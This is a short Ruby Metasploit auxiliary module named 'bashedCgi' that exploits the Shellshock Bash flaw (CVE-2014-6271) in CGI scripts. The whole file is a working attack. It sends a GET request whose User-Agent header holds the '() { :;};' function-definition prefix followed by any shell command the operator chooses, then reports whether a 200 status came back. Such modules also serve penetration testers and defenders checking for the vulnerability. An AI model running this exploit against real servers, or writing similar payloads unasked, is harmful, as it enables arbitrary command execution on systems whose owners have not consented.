require 'msf/core'
 
class Metasploit3 < Msf::Auxiliary
 
    include Msf::Exploit::Remote::HttpClient
 
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'bashedCgi',
            'Description'    => %q{
               Quick & dirty module to send the BASH exploit payload (CVE-2014-6271) to CGI scripts that are BASH-based or invoke BASH, to execute an arbitrary shell command.
            },
            'Author'         => [ 'Shaun Colley <scolley at ioactive.com>' ], # metasploit module
    'Author'     => [ 'Stephane Chazelas' ], # vuln discovery
            'License'        => MSF_LICENSE,
    'References'     => [ 'CVE', '2014-6271' ],
            'Targets'        =>
        [
              [ 'cgi', {} ]
        ],
    'DefaultTarget'  => 0,
    'Payload'        =>
      {
                'Space'      => 1024,
        'DisableNops' => true
      },
    'DefaultOptions' => { 'PAYLOAD' => 0 }
        ))
 
        register_options(
            [
                OptString.new('TARGETURI', [true, 'Absolute path of BASH-based CGI', '/']),
                OptString.new('CMD', [true, 'Command to execute', '/usr/bin/touch /tmp/metasploit'])
    ], self.class)
    end
 
    def run
        res = send_request_cgi({
            'method'   => 'GET',
            'uri'      => datastore['TARGETURI'],
            'agent'    => "() { :;}; " + datastore['CMD']
        })
 
        if res && res.code == 200
            print_good("Command sent - 200 received")
        else
            print_error("Command sent - non-200 reponse")
        end
    end
end
